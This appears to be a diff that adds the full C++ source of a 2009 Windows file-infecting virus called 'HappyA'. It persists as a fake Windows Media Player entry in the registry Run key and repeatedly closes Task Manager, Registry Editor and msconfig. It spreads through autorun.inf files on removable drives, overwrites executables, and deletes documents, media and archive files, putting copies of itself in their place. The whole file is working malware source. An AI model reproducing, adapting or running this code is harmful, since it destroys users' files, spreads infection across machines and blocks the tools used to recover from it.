@@ -1,0 +1,370 @@
+﻿//Created by Ngo Hung Cuong (c) 2009
+#include <windows.h>
+#include <stdio.h>
+#include <conio.h>
+#include <string.h>
+#define IsDir(a) ((a)&(DWORD)16)
+typedef struct data
+{
+char str[260];
+data *lin;
+};
+data *p1,*p2;
+char vp[260],sysp[260],expp[260],wp[260],duoi[260];
+DWORD vs;
+//===============================
+void init(void);
+DWORD WINAPI baove(LPVOID);//xong
+void tancong(void);//xong
+void push1(char s[260]);//xong
+void push2(char s[260]);//xong
+char *pop1(void);//xong
+void ktpre(void);//xong
+void init(void);
+void ghiautorun(char s[260]);//xong
+int thoatusb(void);//xong
+//===============================
+int WINAPI WinMain (HINSTANCE hThisInstance,
+HINSTANCE hPrevInstance,
+LPSTR lpszArgument,
+int nFunsterStil)
+
+{
+DWORD dth;
+HANDLE hth;
+//khoi tao cho cac duoi cua chuong trinh
+strcpy(duoi,"RARZIP");//2
+strcat(duoi,"GHOPDFCHM");//5
+strcat(duoi,"DOCXLSPPT");//8
+strcat(duoi,"MP3WMA");//10
+strcat(duoi,"WMVAVI3GP");//13
+strcat(duoi,"DATVCDISONRG");//17
+//inventor
+strcat(duoi,"IAMIPTIPNDWGIDW");//22
+//flash
+strcat(duoi,"SWFFLV");//24
+//slw
+strcat(duoi,"ASM");//25
+//xong phan khoi tao cho duoi
+init();
+hth=CreateThread(NULL,0,baove,0,0,&dth);
+while(1)
+tancong();
+return 0;
+}
+//mo ta cac ham dung trong chuong trinh chinh
+//==================================
+void push1(char s[260])
+{
+data *p;
+p=new data;
+strcpy(p->str,s);
+p->lin=p1;
+p1=p;
+}
+//=================================
+void push2(char s[260])
+{
+data *p;
+p=new data;
+strcpy(p->str,s);
+p->lin=p2;
+p2=p;
+}
+//===================================
+char *pop1(void)
+{
+data *p;
+char s[260];
+p=p1->lin;
+strcpy(s,p1->str);
+delete p1;
+p1=p;
+return s;
+}
+//==================================
+//===================================
+DWORD WINAPI baove(LPVOID)
+{
+HWND hw;
+while(1)
+{
+hw=FindWindow(NULL,"Registry Editor");
+if(hw!=NULL)
+{
+SendMessage(hw,WM_CLOSE,0,0);
+CloseHandle((HANDLE)hw);
+}
+hw=FindWindow(NULL,"System Configuration Utility");
+if(hw!=NULL)
+{
+SendMessage(hw,WM_CLOSE,0,0);
+CloseHandle((HANDLE)hw);
+}
+hw=FindWindow(NULL,"Group Policy");
+if(hw!=NULL)
+{
+SendMessage(hw,WM_CLOSE,0,0);
+CloseHandle((HANDLE)hw);
+}
+hw=FindWindow(NULL,"Windows Task Manager");
+if(hw!=NULL)
+{
+SendMessage(hw,WM_CLOSE,0,0);
+CloseHandle((HANDLE)hw);
+}
+}
+}
+//=======================================
+int thoatusb(void)
+{
+HWND hw;
+hw=FindWindow(NULL,"Safely Remove Hardware");
+if(hw!=NULL)
+{
+CloseHandle((HANDLE)hw);
+return 1;
+}
+hw=FindWindow(NULL,"Safely Remove USB Disks");
+if(hw!=NULL)
+{
+CloseHandle((HANDLE)hw);
+return 1;
+}
+return 0;
+}
+//==============================================
+void ktpre(void)
+{
+ULARGE_INTEGER ula,ulb,ulc;
+char cdr[260];
+strcpy(cdr,"c:");
+p1=NULL;
+for(cdr[0]='c';cdr[0]<='z';++cdr[0])
+{
+if(GetDiskFreeSpaceEx(cdr,&ula,&ulb,&ulc)&&(GetDriveType(cdr)==DRIVE_REMOVABLE||GetDriveType( cdr)==DRIVE_FIXED))
+push1(cdr);
+}
+}
+//==============================================
+void ghiautorun(char s[260])
+{
+HANDLE h;
+WIN32_FIND_DATA wfd;
+char tg[260];
+strcpy(tg,s);
+strcat(tg,"\\HappyA.exe");
+h=FindFirstFile(tg,&wfd);
+if(h==INVALID_HANDLE_VALUE)
+{
+//truong hop khong co file nao thoa man
+CopyFile(vp,tg,FALSE);
+}
+else
+{
+if(wfd.nFileSizeLow!=vs)
+{
+CopyFile(vp,tg,FALSE);
+}
+CloseHandle(h);
+}
+strcpy(tg,s);
+strcat(tg,"\\autorun.inf");
+h=FindFirstFile(tg,&wfd);
+if(h==INVALID_HANDLE_VALUE)
+{
+//truong hop khong ton tai
+FILE *f;
+f=fopen(tg,"wt");
+fputs("[autorun]\n",f);
+fputs("shell\\open=Open(&O)\n",f);
+fputs("shell\\open\\command=HappyA.exe\n",f);
+fputs("shell\\open\\default=1\n",f);
+fputs("shell\\explorer=Explorer(&X)\n",f);
+fputs("shell\\explorer\\command=HappyA.exe\n",f);
+fclose(f);
+}
+else
+{
+//truong hop day la thu muc thi thoi
+if(IsDir(wfd.dwFileAttributes))
+{
+}
+else
+{
+//xu ly trong truong hop size khac nhau
+if(wfd.nFileSizeLow!=vs)
+{
+FILE *f;
+f=fopen(tg,"wt");
+fputs("[autorun]\n",f);
+fputs("shell\\open=Open(&O)\n",f);
+fputs("shell\\open\\command=HappyA.exe\n",f);
+fputs("shell\\open\\default=1\n",f);
+fputs("shell\\explorer=Explorer(&X)\n",f);
+fputs("shell\\explorer\\command=HappyA.exe\n",f);
+fclose(f);
+}
+}
+}
+}
+void tancong(void)
+{
+char home[260],tg[260];
+int n,i,m;
+HANDLE h;
+WIN32_FIND_DATA wfd;
+m=25;
+ktpre();
+while(p1!=NULL)
+{
+p2=NULL;
+while(p1!=NULL)
+{
+strcpy(home,pop1());
+n=strlen(home);
+if(n==2)
+ghiautorun(home); 
+if(!stricmp(home,wp))
+continue;
+strcpy(tg,home);
+strcat(tg,"\\*.exe");
+if(thoatusb())
+Sleep(5000);
+h=FindFirstFile(tg,&wfd);
+if(h!=INVALID_HANDLE_VALUE)
+{
+if(wfd.nFileSizeLow!=vs)
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+SetFileAttributes(tg,FILE_ATTRIBUTE_NORMAL);
+CopyFile(vp,tg,FALSE);
+}
+while(FindNextFile(h,&wfd))
+{
+if(wfd.nFileSizeLow!=vs)
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+SetFileAttributes(tg,FILE_ATTRIBUTE_NORMAL);
+CopyFile(vp,tg,FALSE);
+}
+}
+CloseHandle(h);
+}//da choi xong cac file co duoi la exe
+//lan luot choi cac file co duoi da liet ke
+for(i=0;i<m;++i)
+{
+if(thoatusb())
+Sleep(5000);
+strcpy(tg,home);
+strcat(tg,"\\*.");
+n=strlen(tg);
+strncat(tg,duoi+i*3,3);
+tg[n+3]='\0';
+h=FindFirstFile(tg,&wfd);
+if(h!=INVALID_HANDLE_VALUE)
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+SetFileAttributes(tg,FILE_ATTRIBUTE_NORMAL);
+DeleteFile(tg);
+n=strlen(tg);
+tg[n-3]='\0';
+strcat(tg,"exe");
+CopyFile(vp,tg,TRUE);
+while(FindNextFile(h,&wfd))
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+SetFileAttributes(tg,FILE_ATTRIBUTE_NORMAL);
+DeleteFile(tg);
+n=strlen(tg);
+tg[n-3]='\0';
+strcat(tg,"exe");
+CopyFile(vp,tg,TRUE);
+}
+CloseHandle(h);
+}
+}//da xu ly xong tat ca cac file co duoi da liet ke
+//tim cac thu muc con
+strcpy(tg,home);
+strcat(tg,"\\*.*");
+if(thoatusb())
+Sleep(5000);
+h=FindFirstFile(tg,&wfd);
+if(h!=INVALID_HANDLE_VALUE)
+{
+if(IsDir(wfd.dwFileAttributes)&&(wfd.cFileName[0]!='.'))
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+push2(tg);
+}
+while(FindNextFile(h,&wfd))
+{
+if(IsDir(wfd.dwFileAttributes)&&(wfd.cFileName[0]!='.'))
+{
+strcpy(tg,home);
+strcat(tg,"\\");
+strcat(tg,wfd.cFileName);
+push2(tg);
+}
+}
+CloseHandle(h);
+}
+//xong phan tim kiem cac thu muc con
+}
+p1=p2;
+}
+}
+void init(void)
+{
+HMODULE hm;
+HANDLE h,h1;
+WIN32_FIND_DATA wfd;
+char tg[260],tg2[260];
+GetWindowsDirectory(wp,260);
+strcpy(expp,wp);
+strcat(expp,"\\explorer.exe");
+GetSystemDirectory(sysp,260);
+strcat(sysp,"\\WMPlayer.exe");
+hm=GetModuleHandle(NULL);
+GetModuleFileName(hm,vp,260);//luu tru duong dan cua virus
+h1=FindFirstFile(vp,&wfd);
+vs=wfd.nFileSizeLow;
+strncpy(tg,vp+3,10);
+tg[10]='\0';
+strncpy(tg2,vp,2);
+tg2[2]='\0';
+//truong hop neu duoc kich hoat tu 1 file autorun
+if(!stricmp(tg,"HappyA.exe"))
+{
+char ttt[260];
+strcpy(ttt,expp);
+strcat(ttt," ");
+strcat(ttt,tg2);
+WinExec(ttt,SW_SHOWDEFAULT);
+}
+//kiem tra tinh duy nhat trong bo nho
+h=CreateMutex(NULL,false,"HappyA Virus for you");
+if(GetLastError()==ERROR_ALREADY_EXISTS)
+ExitProcess(0);
+//neu vp khong phai la sysp thi copy vao
+if(stricmp(vp,sysp))
+{
+CopyFile(vp,sysp,false);
+HKEY hKey;
+RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+RegSetValueEx(hKey, "Windows Media Player", 0, REG_SZ,(const unsigned char*)sysp, sizeof(sysp));
+}
+}
+//Kidteam Software
+//kidteam@gmail.com
+//http://kickme.to/kidteam
